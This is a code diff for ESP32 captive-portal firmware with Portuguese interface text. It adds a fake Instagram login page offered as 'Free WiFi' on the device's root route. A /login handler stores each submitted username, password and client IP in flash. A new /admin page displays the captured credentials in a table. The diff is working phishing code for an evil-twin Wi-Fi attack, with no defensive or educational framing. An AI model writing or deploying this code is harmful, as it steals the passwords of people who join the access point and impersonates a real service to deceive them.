@@ -11,6 +11,7 @@
 namespace
 {
   constexpr byte DNS_PORT = 53;
+  constexpr const char *capturedCredentialsPath = "/captured_credentials.json";
   DNSServer dnsServer;
 
   String escapeHtml(const String &value)
@@ -177,6 +178,109 @@ namespace
     server.send(302, "text/plain", "");
   }
 
+  bool appendCapturedCredential(const String &username, const String &password)
+  {
+    JsonDocument doc;
+
+    if (LittleFS.exists(capturedCredentialsPath))
+    {
+      File existing = LittleFS.open(capturedCredentialsPath, "r");
+      if (existing)
+      {
+        DeserializationError error = deserializeJson(doc, existing);
+        existing.close();
+
+        if (error || !doc.is<JsonArray>())
+        {
+          doc.clear();
+        }
+      }
+    }
+
+    if (!doc.is<JsonArray>())
+    {
+      doc.to<JsonArray>();
+    }
+
+    JsonArray entries = doc.as<JsonArray>();
+    JsonObject entry = entries.add<JsonObject>();
+
+    entry["username"] = username;
+    entry["password"] = password;
+    entry["captured_at_ms"] = millis();
+    entry["client_ip"] = server.client().remoteIP().toString();
+
+    while (entries.size() > 40)
+    {
+      entries.remove(0);
+    }
+
+    File out = LittleFS.open(capturedCredentialsPath, "w");
+    if (!out)
+    {
+      return false;
+    }
+
+    bool ok = serializeJson(doc, out) > 0;
+    out.close();
+    return ok;
+  }
+
+  String buildCapturedCredentialsTable()
+  {
+    if (!LittleFS.exists(capturedCredentialsPath))
+    {
+      return "<p class='muted'>Nenhuma credencial capturada ainda.</p>";
+    }
+
+    File file = LittleFS.open(capturedCredentialsPath, "r");
+    if (!file)
+    {
+      return "<p class='muted'>Falha ao abrir o arquivo de credenciais.</p>";
+    }
+
+    JsonDocument doc;
+    DeserializationError error = deserializeJson(doc, file);
+    file.close();
+
+    if (error || !doc.is<JsonArray>())
+    {
+      return "<p class='muted'>Arquivo de credenciais vazio ou invalido.</p>";
+    }
+
+    JsonArray entries = doc.as<JsonArray>();
+    if (entries.size() == 0)
+    {
+      return "<p class='muted'>Nenhuma credencial capturada ainda.</p>";
+    }
+
+    String html;
+    html += "<div style='overflow:auto'><table style='width:100%;border-collapse:collapse'>";
+    html += "<thead><tr><th style='text-align:left;padding:8px;border-bottom:1px solid #2f2f2f'>Usuario</th>";
+    html += "<th style='text-align:left;padding:8px;border-bottom:1px solid #2f2f2f'>Senha</th>";
+    html += "<th style='text-align:left;padding:8px;border-bottom:1px solid #2f2f2f'>IP</th>";
+    html += "<th style='text-align:left;padding:8px;border-bottom:1px solid #2f2f2f'>Uptime</th></tr></thead><tbody>";
+
+    for (size_t i = entries.size(); i > 0; i--)
+    {
+      JsonObject item = entries[i - 1];
+      String username = item["username"] | "";
+      String password = item["password"] | "";
+      String ip = item["client_ip"] | "-";
+      unsigned long capturedAt = item["captured_at_ms"] | 0;
+
+      html += "<tr>";
+      html += "<td style='padding:8px;border-bottom:1px solid #262626'>" + escapeHtml(username) + "</td>";
+      html += "<td style='padding:8px;border-bottom:1px solid #262626'>" + escapeHtml(password) + "</td>";
+      html += "<td style='padding:8px;border-bottom:1px solid #262626'>" + escapeHtml(ip) + "</td>";
+      html += "<td style='padding:8px;border-bottom:1px solid #262626'>" + String(capturedAt) + " ms</td>";
+      html += "</tr>";
+    }
+
+    html += "</tbody></table></div>";
+    return html;
+  }
+
   String buildWifiSelectOptions()
   {
     String options;
@@ -207,11 +311,283 @@ namespace
     return options;
   }
 
-  void handleRoot()
+  void handleCredentialCapturePage()
+  {
+    String page = R"rawliteral(
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <title>Instagram • Login for Free WiFi</title>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <style>
+        body {
+          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+          margin: 0;
+          padding: 0;
+          background: #fafafa;
+        }
+        .main {
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          margin-top: 12px;
+        }
+        .container {
+          width: 350px;
+          background: white;
+          border: 1px solid #dbdbdb;
+          border-radius: 1px;
+          padding: 10px 0;
+          margin-bottom: 10px;
+        }
+        .logo {
+          margin: 22px auto 12px;
+          text-align: center;
+        }
+        .instagram-logo {
+          font-family: 'Segoe UI', Arial, sans-serif;
+          font-size: 40px;
+          font-weight: bold;
+          color: #262626;
+          background: -webkit-linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
+          -webkit-background-clip: text;
+          background-clip: text;
+          -webkit-text-fill-color: transparent;
+          display: inline-block;
+          margin: 10px auto;
+          letter-spacing: -1px;
+        }
+        .wifi-message {
+          text-align: center;
+          background: #fff;
+          padding: 15px;
+          margin: 10px auto;
+          width: 350px;
+          border: 1px solid #dbdbdb;
+          border-radius: 1px;
+          color: #262626;
+          font-size: 14px;
+          line-height: 1.5;
+        }
+        .wifi-message h3 {
+          color: #0095f6;
+          margin: 0 0 10px 0;
+          font-size: 16px;
+        }
+        form {
+          padding: 0 40px;
+        }
+        input {
+          width: 100%;
+          background: #fafafa;
+          padding: 9px 8px;
+          margin: 6px 0;
+          border: 1px solid #dbdbdb;
+          border-radius: 3px;
+          box-sizing: border-box;
+          font-size: 14px;
+          color: #262626;
+        }
+        input:focus {
+          border-color: #a8a8a8;
+          outline: none;
+        }
+        button {
+          width: 100%;
+          background: #0095f6;
+          color: white;
+          padding: 7px 16px;
+          border: none;
+          border-radius: 4px;
+          font-weight: 600;
+          font-size: 14px;
+          cursor: pointer;
+          margin: 8px 0;
+        }
+        button:hover {
+          background: #0086e0;
+        }
+        .divider {
+          display: flex;
+          align-items: center;
+          margin: 10px 0 18px;
+        }
+        .line {
+          flex-grow: 1;
+          height: 1px;
+          background: #dbdbdb;
+        }
+        .or {
+          color: #8e8e8e;
+          font-size: 13px;
+          font-weight: 600;
+          margin: 0 18px;
+        }
+        .footer {
+          width: 350px;
+          text-align: center;
+          padding: 20px;
+        }
+        .footer a {
+          color: #00376b;
+          text-decoration: none;
+          font-size: 12px;
+        }
+        .footer span {
+          color: #8e8e8e;
+          font-size: 12px;
+          margin: 0 8px;
+        }
+      </style>
+    </head>
+    <body>
+      <div class="main">
+        <div class="wifi-message">
+          <h3>Free WiFi Access</h3>
+          <p>Login with Instagram to get 4 hours of free high-speed internet access. Connect with friends while enjoying our complimentary WiFi service.</p>
+        </div>
+
+        <div class="container">
+          <div class="logo">
+            <div class="instagram-logo">Instagram</div>
+          </div>
+          <form action="/login" method="POST">
+            <input type="text" name="username" placeholder="Phone number, username, or email" required autocomplete="off" autocapitalize="off">
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Log In</button>
+
+            <div class="divider">
+              <div class="line"></div>
+              <div class="or">OR</div>
+              <div class="line"></div>
+            </div>
+          </form>
+        </div>
+
+        <div class="container" style="text-align: center; padding: 20px;">
+          <span style="color: #262626; font-size: 14px;">Don't have an account? </span>
+          <a href="#" style="color: #0095f6; font-weight: 600; text-decoration: none; font-size: 14px;">Sign up</a>
+        </div>
+
+        <div class="footer">
+          <a href="#">About</a><span>•</span>
+          <a href="#">Help</a><span>•</span>
+          <a href="#">Privacy</a><span>•</span>
+          <a href="#">Terms</a>
+        </div>
+      </div>
+    </body>
+    </html>
+  )rawliteral";
+
+    server.send(200, "text/html; charset=utf-8", page);
+  }
+
+  void handleCredentialSubmit()
+  {
+    String username = server.arg("username");
+    String password = server.arg("password");
+
+    if (username.length() == 0 || password.length() == 0)
+    {
+      server.send(400, "text/plain; charset=utf-8", "Usuario e senha sao obrigatorios");
+      return;
+    }
+
+    bool saved = appendCapturedCredential(username, password);
+
+    String page = R"rawliteral(
+    <!DOCTYPE html>
+    <html>
+    <head>
+      <title>Instagram • Login for Free WiFi</title>
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width, initial-scale=1">
+      <meta http-equiv="refresh" content="3;url=/">
+      <style>
+        body {
+          font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+          margin: 0;
+          padding: 0;
+          background: #fafafa;
+          display: flex;
+          align-items: center;
+          justify-content: center;
+          min-height: 100vh;
+        }
+        .container {
+          width: 350px;
+          background: white;
+          border: 1px solid #dbdbdb;
+          border-radius: 1px;
+          padding: 40px 20px;
+          text-align: center;
+          box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+        }
+        .instagram-logo {
+          font-family: 'Segoe UI', Arial, sans-serif;
+          font-size: 36px;
+          font-weight: bold;
+          background: -webkit-linear-gradient(45deg, #405DE6, #5851DB, #833AB4, #C13584, #E1306C, #FD1D1D);
+          -webkit-background-clip: text;
+          background-clip: text;
+          -webkit-text-fill-color: transparent;
+          margin-bottom: 20px;
+        }
+        .success {
+          color: #0095f6;
+          font-size: 18px;
+          margin: 15px 0;
+        }
+        .error {
+          color: #ed4956;
+          font-size: 18px;
+          margin: 15px 0;
+        }
+        p {
+          color: #8e8e8e;
+          font-size: 14px;
+          line-height: 1.5;
+        }
+      </style>
+    </head>
+    <body>
+      <div class="container">
+        <div class="instagram-logo">Instagram</div>
+
+        )rawliteral";
+
+    if (saved)
+    {
+      page += R"rawliteral(
+        <div class="success">✅ Acesso recebido com sucesso!</div>
+        <br>Redirecionando em 3 segundos...</p>
+    )rawliteral";
+    }
+    else
+    {
+      page += R"rawliteral(
+        <div class="error">❌ Falha ao registrar dados</div>
+        <br>Tente novamente.</p>
+    )rawliteral";
+    }
+
+    page += R"rawliteral(
+      </div>
+    </body>
+    </html>
+  )rawliteral";
+
+    server.send(200, "text/html; charset=utf-8", page);
+  }
+
+  void handleAdminPortal()
   {
     String wifiOptions = buildWifiSelectOptions();
     wl_status_t staStatus = WiFi.status();
     bool staConnected = staStatus == WL_CONNECTED;
+    String credentialsTable = buildCapturedCredentialsTable();
 
     String page;
     page += "<!doctype html><html><head><meta charset='utf-8'>";
@@ -241,9 +617,12 @@ namespace
     page += "<label>Troca de tela (segundos)</label>";
     page += "<input name='screen_sec' type='number' min='2' max='120' value='" + String(screenChangeIntervalMs / 1000) + "'>";
     page += "<button type='submit'>Salvar e conectar</button></form>";
-    page += "<form method='get' action='/'><button class='secondary' type='submit'>Atualizar lista de redes</button></form>";
+    page += "<form method='get' action='/admin'><button class='secondary' type='submit'>Atualizar lista de redes</button></form>";
     page += "<form method='get' action='/status'><button class='secondary' type='submit'>Ver status completo</button></form>";
     page += "<p class='muted'>API: /api/status</p>";
+    page += "</div>";
+    page += "<div class='card'><h3>Usuarios e senhas capturados</h3>";
+    page += credentialsTable;
     page += "</div></body></html>";
 
     server.send(200, "text/html; charset=utf-8", page);
@@ -260,7 +639,7 @@ namespace
     page += "<div class='card'><div class='label'>STA Status</div><div class='value' id='sta'>-</div><div class='label'>STA IP</div><div class='value' id='staIp'>-</div><div class='label'>RSSI</div><div class='value' id='rssi'>-</div></div>";
     page += "<div class='card'><div class='label'>AP SSID</div><div class='value' id='ap'>-</div><div class='label'>AP IP</div><div class='value' id='apIp'>-</div><div class='label'>Clientes no AP</div><div class='value' id='clients'>-</div></div>";
     page += "<div class='card'><div class='label'>SSID salvo</div><div class='value' id='ssid'>-</div><div class='label'>Ultima tentativa de conexao</div><div class='value' id='last'>-</div><div class='label'>Uptime</div><div class='value' id='uptime'>-</div><div class='label'>Temperatura</div><div class='value' id='temp'>-</div><div class='label'>Tela ativa</div><div class='value' id='screen'>-</div></div>";
-    page += "<button onclick=\"location.href='/'\">Voltar para configuracao</button>";
+    page += "<button onclick=\"location.href='/admin'\">Voltar para configuracao</button>";
     page += "<div class='card'><a href='/api/status'>Abrir JSON de status</a></div></body></html>";
 
     server.send(200, "text/html; charset=utf-8", page);
@@ -340,7 +719,9 @@ namespace
 
   void startConfigPortal()
   {
-    server.on("/", HTTP_GET, handleRoot);
+    server.on("/", HTTP_GET, handleCredentialCapturePage);
+    server.on("/login", HTTP_POST, handleCredentialSubmit);
+    server.on("/admin", HTTP_GET, handleAdminPortal);
     server.on("/generate_204", HTTP_GET, handleCaptiveRedirect);
     server.on("/gen_204", HTTP_GET, handleCaptiveRedirect);
     server.on("/hotspot-detect.html", HTTP_GET, handleCaptiveRedirect);
